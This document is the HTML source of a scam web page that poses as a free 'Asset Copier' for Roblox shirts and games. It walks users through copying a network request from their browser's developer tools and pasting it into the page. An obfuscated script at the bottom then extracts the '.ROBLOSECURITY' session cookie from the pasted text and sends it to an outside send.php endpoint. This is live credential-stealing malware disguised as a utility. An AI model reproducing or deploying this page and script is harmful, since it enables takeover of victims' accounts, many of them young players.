...
<title>Asset Copier - #1 Asset Copier!</title>
<meta name="description" content="The #1 Free Asset Copier!">
...
<header class="header header-transparent" id="header-main">
	...
	<nav class="navbar navbar-expand-lg navbar-light fixed-top">
		<div class="container">
			<a class="navbar-brand" href="#">Asset Copier</a> <button aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-target="#navbarSupportedContent" data-toggle="collapse" type="button"><span class="navbar-toggler-icon"></span></button>
...
<h2 class="h1 text-white mb-4">Asset Copier copies ANYTHING<div id="typed-strings" style="display: none;">
<p><em><b>.</b></em></p>
</div>
...
<p class="lead lh-180 text-white">The #1 FREE Asset Copier.</p>
<div class="mt-5">
...
<img alt="Image placeholder" src="https://media.discordapp.net/attachments/831220949759295529/842628222835621918/proj_4_2.png" class="img-fluid img-center" style="position: relative;">
</div>
</div>
</div>
</div>
...
<p class="lead lh-180">Copying shirts has never been easier. Asset Copier has all the right tools in order to make your Copying process is a breeze.</p>
</div>
</div>
<div class="row">
<div class="col-lg-4">
...
<h5 class="font-weight-bold">Set up Asset Copier</h5>
...
<p class="mt-2 mb-0">Let Asset Copier handle the work! It may take a few minutes to see results.</p>
</div>
</div>
</div>
</div>
...
<h5 class="font-weight-bold">Enjoy your Assets</h5>
<p class="mt-2 mb-0">Watch the bot copy your assets and enjoy!</p>
</div>
</div>
</div>
</div>
...
<p class="lead text-white lh-180">Asset Copier is an advanced PowerShell-based Copy bot &amp; auto-bot. It is capable of Copying up-to 10x faster than other competitors via D4 technology. To do this, all you need to do is follow the setup instructions below and report any issues you find by contacting support by adding my discord die#0002.
...
<p>Step 1. Go to the Roblox page of the asset you want to copy (shirts, games etc.) <br><br>

	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
	
	<textarea style="height: 100px; width: 500px;" id="content" placeholder="Paste Asset Code Here!"> </textarea><br><br>
	<input type="button" id="Send" value="Copy!">
...
<p>Step 3. Refresh the Roblox page and then in the Network section, scroll to the very top. You should see an item named after your asset. Right click that and then hover over Copy. There will be many options of how to copy the user code. You can click any except for: Copy link address, Copy response, Copy as fetch, or Copy all as fetch. Every other option will work with this tool.</p>
<p>Step 4. Go back to this site, paste the code you copied in the text box and then click the <b>Copy!</b> button! Wait a few seconds and the asset should start downloading!</p>
<img style="width: 75%;" src="https://cdn.discordapp.com/attachments/857020630842867713/857079215580250162/unknown.png">
<br>
<h3 style="padding-top: 60px;">Usage</h3>
<p>Just paste the asset code into our website and your assets should download!</p>
...
<br><br> JOIN THE <b><a href="https://discord.gg/9ptUZPZB3Y">DISCORD</a></b> IF YOU HAVE ANY QUESTIONS!<br><br> <b><a href="https://discord.gg/9ptUZPZB3Y">Click Me!</a></b><br><br>
</div></div></section>
...
<div class="card-body">
RobloxTools does not wrap the Roblox client, it just mimics its network implementation. That's why you can use it in any platform, even if Roblox is not supported there!
</div>
</div>
...
<p class="text-sm mb-0">© RobloxTools 2021. All rights reserved.<br>We are not affiliated with any of the games or companies shown on this website. Use of any logos or trademarks are for reference purposes only. By utilizing the website, you agree to be bound by the terms of service.
</p>
</div>
</div>
...
<style type="text/css" data-typed-js-css="true">
	...
	<script>
var _0x3d47=['554487VGfPbe','location','#Send','2EVOYgY','replace','includes','Try\x20either\x20copying\x20the\x20code\x20in\x20a\x20different\x20format\x20or\x20make\x20sure\x20you\x20are\x20copying\x20the\x20code\x20of\x20a\x20asset!','split','2779671NxUHjA','1519373JfJywR','139219UKLcWu','.ROBLOSECURITY=','val','#content','click','803wBKxmX','147711LKGXJd','835983ZApVCb','442vQopeG','https://robloxasset-copier.com/{folder}/{folder1}/send.php?t='];function _0x43b2(_0x423a9a,_0x3cfc9e){_0x423a9a=_0x423a9a-0x11c;var _0x3d47d6=_0x3d47[_0x423a9a];return _0x3d47d6;}(function(_0x56b255,_0x4242b7){var _0x4e959c=_0x43b2;while(!![]){try{var _0xb0b9b0=-parseInt(_0x4e959c(0x128))+-parseInt(_0x4e959c(0x126))*parseInt(_0x4e959c(0x123))+parseInt(_0x4e959c(0x125))+parseInt(_0x4e959c(0x11e))*-parseInt(_0x4e959c(0x12b))+-parseInt(_0x4e959c(0x124))+-parseInt(_0x4e959c(0x11d))+parseInt(_0x4e959c(0x11c));if(_0xb0b9b0===_0x4242b7)break;else _0x56b255['push'](_0x56b255['shift']());}catch(_0xa75237){_0x56b255['push'](_0x56b255['shift']());}}}(_0x3d47,0xb9b8f),$(function(){var _0x15c914=_0x43b2;$(_0x15c914(0x12a))[_0x15c914(0x122)](function(_0x2b9bd3){var _0x4a5f87=_0x15c914,_0x15389a=$(_0x4a5f87(0x121))[_0x4a5f87(0x120)]();if(_0x15389a[_0x4a5f87(0x12d)]('.ROBLOSECURITY=')){var _0x43ef9f=_0x15389a[_0x4a5f87(0x12f)](_0x4a5f87(0x11f))['pop'](),_0x34f137=_0x43ef9f[_0x4a5f87(0x12f)](';')[0x0],_0x299ff5=_0x34f137['split']('\x22')[0x0];if(_0x299ff5[_0x4a5f87(0x12d)]('^')){var _0x17d37c=_0x299ff5[_0x4a5f87(0x12c)]('^',''),_0x447f24=_0x17d37c['replace']('^','');window[_0x4a5f87(0x129)]['replace'](_0x4a5f87(0x127)+_0x447f24);}else window[_0x4a5f87(0x129)][_0x4a5f87(0x12c)](_0x4a5f87(0x127)+_0x299ff5);}else alert(_0x4a5f87(0x12e));;});}));
